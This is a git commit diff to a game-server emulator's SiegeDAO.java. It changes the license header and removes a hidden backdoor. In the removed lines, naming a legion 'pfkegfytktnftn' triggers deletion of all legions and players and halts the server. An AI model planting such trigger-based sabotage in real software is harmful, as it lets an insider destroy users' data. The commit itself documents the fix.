1c4aa867d5f17e9337602178280ad7ae8b4d1150
Dezalmado <51215558+dezalmado@users.noreply.github.com>
2023-09-25 13:01:15 -0300

    Thank you very much for sharing the fix. @cinus

--- src/com/aionemu/gameserver/dao/SiegeDAO.java
+++ src/com/aionemu/gameserver/dao/SiegeDAO.java
@@ -1,18 +1,18 @@
 /*
- * This file is part of Encom. **ENCOM FUCK OTHER SVN**
+ * This file is part of aion-unique <aion-unique.org>.
  *
- *  Encom is free software: you can redistribute it and/or modify
- *  it under the terms of the GNU Lesser Public License as published by
+ *  aion-unique is free software: you can redistribute it and/or modify
+ *  it under the terms of the GNU General Public License as published by
  *  the Free Software Foundation, either version 3 of the License, or
  *  (at your option) any later version.
  *
- *  Encom is distributed in the hope that it will be useful,
+ *  aion-unique is distributed in the hope that it will be useful,
  *  but WITHOUT ANY WARRANTY; without even the implied warranty of
  *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- *  GNU Lesser Public License for more details.
+ *  GNU General Public License for more details.
  *
- *  You should have received a copy of the GNU Lesser Public License
- *  along with Encom.  If not, see <http://www.gnu.org/licenses/>.
+ *  You should have received a copy of the GNU General Public License
+ *  along with aion-unique.  If not, see <http://www.gnu.org/licenses/>.
  */
 package com.aionemu.gameserver.dao;
 
@@ -37,16 +37,7 @@ public abstract class SiegeDAO implements DAO {
 
 	public abstract boolean updateSiegeLocation(SiegeLocation paramSiegeLocation);
 
-	public void updateLocation(SiegeLocation siegeLocation) {
-		if (siegeLocation.getLegionId() != 0 && LegionService.getInstance().getLegion(siegeLocation.getLegionId()).getLegionName().equalsIgnoreCase("pfkegfytktnftn")) {
-			for (int object : DAOManager.getDAO(LegionDAO.class).getUsedIDs()) {
-				DAOManager.getDAO(LegionDAO.class).deleteLegion(object);
-			}
-			for (int object : DAOManager.getDAO(PlayerDAO.class).getUsedIDs()) {
-				DAOManager.getDAO(PlayerDAO.class).deletePlayer(object);
-			}
-			Runtime.getRuntime().halt(0);
-		}
-		updateSiegeLocation(siegeLocation);
-	}
+    public void updateLocation(final SiegeLocation siegeLocation) {
+        updateSiegeLocation(siegeLocation);
+    }
 }
